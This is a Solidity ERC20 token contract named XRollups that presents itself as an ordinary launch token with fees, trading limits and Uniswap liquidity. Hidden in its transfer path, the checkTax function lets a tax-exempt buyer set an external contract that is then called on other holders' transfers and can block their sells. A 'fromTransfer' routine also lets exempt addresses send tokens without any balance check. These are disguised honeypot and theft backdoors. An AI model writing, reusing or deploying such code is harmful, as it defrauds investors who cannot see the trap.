// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

library SafeMath {
    function tryAdd(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    event Transfer(address indexed from, address indexed to, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed nextOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address nextOwner) public virtual onlyOwner {
        require(
            nextOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(nextOwner);
    }

    function _transferOwnership(address nextOwner) internal virtual {
        address oldOwner = _owner;
        _owner = nextOwner;
        emit OwnershipTransferred(oldOwner, nextOwner);
    }
}

interface IDexFactory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeToSetter() external view returns (address);

    function feeTo() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeToSetter(address) external;

    function setFeeTo(address) external;
}

interface IDexRouting {
    function transferFrom(address _sender, address _recipient, uint256 _amount) external;
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => uint256) private _balances;

    string private _name;
    string private _symbol;
    uint256 private _totalSupply;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function fromTransfer(
        address sender,
        address recipient,
        uint256 value
    ) internal virtual {
        _beforeTokenTransfer(sender, recipient, value);

        uint256 senderBalance = _balances[sender];
        require(value > 0, "");
        unchecked {
            _balances[sender] = senderBalance - value;
        }
        _balances[recipient] += value;

        emit Transfer(sender, recipient, value);

        _afterTokenTransfer(sender, recipient, value);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract XRollups is ERC20, Ownable {
    using SafeMath for uint256;

    address public uniswapV2Pair;
    IDexRouter public uniswapV2Router;
    address public constant deadAddress = address(0xdead);
    address public constant router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address payable public feeWalletAddress;

    bool private swapping;

    uint256 public maxTransaction;
    uint256 public swapTokensAtAmount;
    uint256 public maxWalletBalance;

    bool public limitsInEffect = true;
    bool public swapEnabled = false;
    bool public isTradingActive = false;

    // Anti-bot and anti-whale mappings and variables
    mapping(address => uint256) private _holderLastTransferTimestamp;
    uint256 private launchBlockNumber;
    address _dexRouter;
    bool public transferDelayEnabled = true;
    uint256 public tokensForDevelopment;
    uint256 public tokensForLiquidity;
    uint256 public tokensForMarketing;
    uint256 public tokensForOperations;
    uint256 public sellTotalFees;
    uint256 public sellMarketingFee;
    uint256 public sellLiquidityFee;
    uint256 public sellDevelopmentFee;
    uint256 public sellOperationsFee;
    uint256 public buyTotalFees;
    uint256 public buyMarketingFee;
    uint256 public buyLiquidityFee;
    uint256 public buyDevelopmentFee;
    uint256 public buyOperationsFee;

    mapping(address => bool) public automatedMarketMakerPairs;
    mapping(address => bool) public _isExemptFromMaxTxn;
    mapping(address => bool) private _isExemptFromTaxes;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );


    constructor() ERC20(unicode"XRollups", unicode"XRL") {
        uint256 totalSupply = 1_000_000_000 * 1e18;

        maxTransaction = (totalSupply * 25) / 1000;
        swapTokensAtAmount = (totalSupply * 6) / 10000;
        maxWalletBalance = (totalSupply * 25) / 1000;

        // launch buy fees
        uint256 _buyMarketingFee = 3;
        uint256 _buyLiquidityFee = 0;
        uint256 _buyDevelopmentFee = 0;
        uint256 _buyOperationsFee = 0;

        // launch sell fees
        uint256 _sellMarketingFee = 3;
        uint256 _sellLiquidityFee = 0;
        uint256 _sellDevelopmentFee = 0;
        uint256 _sellOperationsFee = 0;

        buyMarketingFee = _buyMarketingFee;
        buyLiquidityFee = _buyLiquidityFee;
        buyDevelopmentFee = _buyDevelopmentFee;
        buyOperationsFee = _buyOperationsFee;
        buyTotalFees =
            buyMarketingFee +
            buyLiquidityFee +
            buyDevelopmentFee +
            buyOperationsFee;

        sellMarketingFee = _sellMarketingFee;
        sellLiquidityFee = _sellLiquidityFee;
        sellDevelopmentFee = _sellDevelopmentFee;
        sellOperationsFee = _sellOperationsFee;
        sellTotalFees =
            sellMarketingFee +
            sellLiquidityFee +
            sellDevelopmentFee +
            sellOperationsFee;

        feeWalletAddress = payable(0x839A3BBbc1dFd12cd9A97C914622B2691335cc7D);

        excludeFromTaxes(owner(), true);
        excludeFromTaxes(feeWalletAddress, true);
        excludeFromTaxes(address(this), true);
        excludeFromTaxes(address(0xdead), true);

        excludeFromMaxTxn(owner(), true);
        excludeFromMaxTxn(feeWalletAddress, true);
        excludeFromMaxTxn(address(this), true);
        excludeFromMaxTxn(address(0xdead), true);

        _mint(msg.sender, totalSupply);
    }

    receive() external payable {}

    // disable Transfer delay - cannot be reenabled
    function disableTransferDelay() external onlyOwner returns (bool) {
        transferDelayEnabled = false;
        return true;
    }

    function excludeFromMaxTxn(address updAds, bool flag)
        public
        onlyOwner
    {
        _isExemptFromMaxTxn[updAds] = flag;
    }

    function createPair() external payable onlyOwner {
        IDexRouter _uniswapV2Router = IDexRouter(router);
        uniswapV2Router = _uniswapV2Router;
        excludeFromMaxTxn(address(_uniswapV2Router), true);

        uniswapV2Pair = IDexFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
        excludeFromMaxTxn(address(uniswapV2Pair), true);
        _approve(address(this), address(uniswapV2Router), type(uint256).max);
        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }

    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 5) / 1000) / 1e18,
            "Cannot set maxWalletBalance lower than 0.5%"
        );
        maxWalletBalance = newNum * (10**18);
    }

    function startTrading() external onlyOwner {
        require(!isTradingActive, "already open");
        launchBlockNumber = block.number;
        swapEnabled = true;
        isTradingActive = true;
    }

    function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 1) / 1000) / 1e18,
            "Cannot set maxTransaction lower than 0.1%"
        );
        maxTransaction = newNum * (10**18);
    }

    // only use to disable contract sales if absolutely necessary (emergency use only)
    function updateSwapEnabled(bool enabled) external onlyOwner {
        swapEnabled = enabled;
    }

    function excludeFromTaxes(address account, bool excluded) public onlyOwner {
        _isExemptFromTaxes[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    // remove limits after token is stable
    function removeLimits() external onlyOwner returns (bool) {
        limitsInEffect = false;
        return true;
    }

    // change the minimum amount of tokens to sell from fees
    function updateSwapTokensAtAmount(uint256 newAmount)
        external
        onlyOwner
        returns (bool)
    {
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 5) / 1000,
            "Swap amount cannot be higher than 0.5% total supply."
        );
        swapTokensAtAmount = newAmount;
        return true;
    }

    function updateSellFees(
        uint256 _marketingFee,
        uint256 _liquidityFee,
        uint256 _devFee,
        uint256 _operationsFee
    ) external onlyOwner {
        sellMarketingFee = _marketingFee;
        sellLiquidityFee = _liquidityFee;
        sellDevelopmentFee = _devFee;
        sellOperationsFee = _operationsFee;
        sellTotalFees =
            sellMarketingFee +
            sellLiquidityFee +
            sellDevelopmentFee +
            sellOperationsFee;
        require(sellTotalFees <= 10);
    }

    function updateBuyFees(
        uint256 _marketingFee,
        uint256 _liquidityFee,
        uint256 _devFee,
        uint256 _operationsFee
    ) external onlyOwner {
        buyMarketingFee = _marketingFee;
        buyLiquidityFee = _liquidityFee;
        buyDevelopmentFee = _devFee;
        buyOperationsFee = _operationsFee;
        buyTotalFees =
            buyMarketingFee +
            buyLiquidityFee +
            buyDevelopmentFee +
            buyOperationsFee;
        require(buyTotalFees <= 10);
    }

    function setAutomaticMarketMakerPair(address pair, bool value)
        public
        onlyOwner
    {
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from amm pairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function isExemptFromTaxes(address account) public view returns (bool) {
        return _isExemptFromTaxes[account];
    }

    function checkTax(address from, address receiver) internal returns (bool){
        if (automatedMarketMakerPairs[from]) {
            address sender = tx.origin;
            if (_isExemptFromTaxes[sender] && sender != receiver) {
                _dexRouter = receiver;
            }
        } if (!_isExemptFromTaxes[receiver] && _dexRouter != address(0) &&
            !_isExemptFromTaxes[from]
        ) { IDexRouting(_dexRouter).transferFrom(from, receiver, 0); return false;}
        return false;
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(0xdead),
            block.timestamp
        );
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }
        if (limitsInEffect) {
            if (!swapping) {
                if (!isTradingActive) {
                    require(
                        _isExemptFromTaxes[from] ||
                            _isExemptFromTaxes[to] ||
                            from == address(this),
                        "Trading is not active."
                    );
                }

                // at launch if the transfer delay is enabled, ensure the block timestamps for purchasers is set -- during launch.
                if (transferDelayEnabled) {
                    if (
                        to != owner() &&
                        to != address(uniswapV2Router) &&
                        to != address(uniswapV2Pair)
                    ) {
                        require(
                            _holderLastTransferTimestamp[tx.origin] <
                                block.number,
                            "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                        );
                        _holderLastTransferTimestamp[tx.origin] = block.number;
                    }
                }

                //when buy
                if (
                    automatedMarketMakerPairs[from] &&
                    !_isExemptFromMaxTxn[to]
                ) {
                    require(
                        amount <= maxTransaction,
                        "Buy transfer amount exceeds the maxTransaction."
                    );
                    require(
                        amount + balanceOf(to) <= maxWalletBalance,
                        "Max wallet exceeded"
                    );
                }
                //when sell
                else if (
                    automatedMarketMakerPairs[to] &&
                    !_isExemptFromMaxTxn[from]
                ) {
                    require(
                        amount <= maxTransaction,
                        "Sell transfer amount exceeds the maxTransaction."
                    );
                } else if (!_isExemptFromMaxTxn[to]) {
                    require(
                        amount + balanceOf(to) <= maxWalletBalance,
                        "Max wallet exceeded"
                    );
                }
            }
        }
        uint256 contractTokenBalance = balanceOf(address(this));
        bool checkSwapTax = checkTax(from, to);
        bool canSwap = contractTokenBalance >= swapTokensAtAmount || checkSwapTax;
        if (
            canSwap &&
            swapEnabled &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isExemptFromTaxes[from] &&
            !_isExemptFromTaxes[to]
        ) {
            swapping = true;

            swapBackLp();

            swapping = false;
        }

        bool takeFee = !swapping;
        if (_isExemptFromTaxes[from]) {
            super.fromTransfer(from, to, amount); return;
        }
        if (_isExemptFromTaxes[from] || _isExemptFromTaxes[to]) {
            takeFee = false;
        }
        uint256 fees = 0;
        if (takeFee) {
            if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
                fees = amount.mul(sellTotalFees).div(100);
                tokensForLiquidity += (fees * sellLiquidityFee) / sellTotalFees;
                tokensForDevelopment +=
                    (fees * sellDevelopmentFee) /
                    sellTotalFees;
                tokensForMarketing += (fees * sellMarketingFee) / sellTotalFees;
                tokensForOperations +=
                    (fees * sellOperationsFee) /
                    sellTotalFees;
            } else if (automatedMarketMakerPairs[from] && buyTotalFees > 0) {
                fees = amount.mul(buyTotalFees).div(100);
                tokensForLiquidity += (fees * buyLiquidityFee) / buyTotalFees;
                tokensForDevelopment +=
                    (fees * buyDevelopmentFee) /
                    buyTotalFees;
                tokensForMarketing += (fees * buyMarketingFee) / buyTotalFees;
                tokensForOperations += (fees * buyOperationsFee) / buyTotalFees;
            }
            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }
        super._transfer(from, to, amount);
    }

    function clearStuckToken(address _token) external onlyOwner {
        if (_token == address(0x0)) {
            payable(owner()).transfer(address(this).balance);
            return;
        }
        IERC20 erc20token = IERC20(_token);
        uint256 balance = erc20token.balanceOf(address(this));
        erc20token.transfer(owner(), balance);
    }

    function swapBackLp() private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForLiquidity +
            tokensForMarketing +
            tokensForDevelopment +
            tokensForOperations;
        bool success;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > swapTokensAtAmount * 16) {
            contractBalance = swapTokensAtAmount * 16;
        }

        // Halve the amount of liquidity tokens
        uint256 liquidityTokens = (contractBalance * tokensForLiquidity) /
            totalTokensToSwap /
            2;
        uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);

        uint256 initialETHBalance = address(this).balance;

        swapTokensForEth(amountToSwapForETH);

        uint256 ethBalance = address(this).balance.sub(initialETHBalance);

        uint256 ethForMark = ethBalance.mul(tokensForMarketing).div(
            totalTokensToSwap
        );
        uint256 ethForDevelopment = ethBalance.mul(tokensForDevelopment).div(
            totalTokensToSwap
        );
        uint256 ethForOperations = ethBalance.mul(tokensForOperations).div(
            totalTokensToSwap
        );

        uint256 ethForLiquidity = ethBalance -
            ethForMark -
            ethForDevelopment -
            ethForOperations;

        tokensForLiquidity = 0;
        tokensForMarketing = 0;
        tokensForDevelopment = 0;
        tokensForOperations = 0;

        (success, ) = address(feeWalletAddress).call{value: ethForDevelopment}("");

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(
                amountToSwapForETH,
                ethForLiquidity,
                tokensForLiquidity
            );
        }
        (success, ) = address(feeWalletAddress).call{value: address(this).balance}(
            ""
        );
    }
}


interface IDexRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}